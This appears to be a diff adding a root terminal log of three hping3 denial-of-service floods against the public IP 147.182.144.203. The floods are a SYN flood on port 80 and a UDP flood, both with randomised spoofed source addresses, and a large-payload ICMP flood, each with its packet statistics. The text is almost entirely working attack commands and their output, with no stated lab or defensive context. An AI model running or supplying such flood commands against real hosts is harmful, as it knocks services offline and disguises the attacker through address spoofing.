@@ -1,0 +1,36 @@
+1.root@lamp-ubuntu-24:/var/www/html# hping3 -S -p 80 --rand-source -c 10000 -i u1 147.182.144.203
+HPING 147.182.144.203 (eth0 147.182.144.203): S set, 40 headers + 0 data bytes
+
+--- 147.182.144.203 hping statistic ---
+10000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+2.root@lamp-ubuntu-24:/var/www/html# hping3 --udp --rand-source -c 9000 -i u10000 147.182.144.203
+HPING 147.182.144.203 (eth0 147.182.144.203): udp mode set, 28 headers + 0 data bytes
+
+--- 147.182.144.203 hping statistic ---
+9000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+root@lamp-ubuntu-24:/var/www/html#
+
+
+3.
+
+root@lamp-ubuntu-24:/var/www/html# hping3 --icmp -d 1024 -c 11000 -i u13333 147.182.144.203
+HPING 147.182.144.203 (eth0 147.182.144.203): icmp mode set, 28 headers + 1024 data bytes
+len=1052 ip=147.182.144.203 ttl=63 id=41787 icmp_seq=0 rtt=6.7 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41791 icmp_seq=1 rtt=3.1 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41793 icmp_seq=2 rtt=3.6 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41795 icmp_seq=3 rtt=2.0 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41801 icmp_seq=4 rtt=2.5 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41814 icmp_seq=5 rtt=3.0 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41818 icmp_seq=6 rtt=3.5 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41824 icmp_seq=7 rtt=2.0 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41835 icmp_seq=8 rtt=2.5 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41843 icmp_seq=9 rtt=3.0 ms
+len=1052 ip=147.182.144.203 ttl=63 id=41848 icmp_seq=10 rtt=3.4 ms--- 147.182.144.203 hping statistic ---
+2464 packets transmitted, 2464 packets received, 0% packet loss
+round-trip min/avg/max = 1.8/3.3/1002.0 ms
+
+len=1052 ip=147.182.144.203 ttl=63 id=41851 icmp_seq=11 rtt=3.8 ms
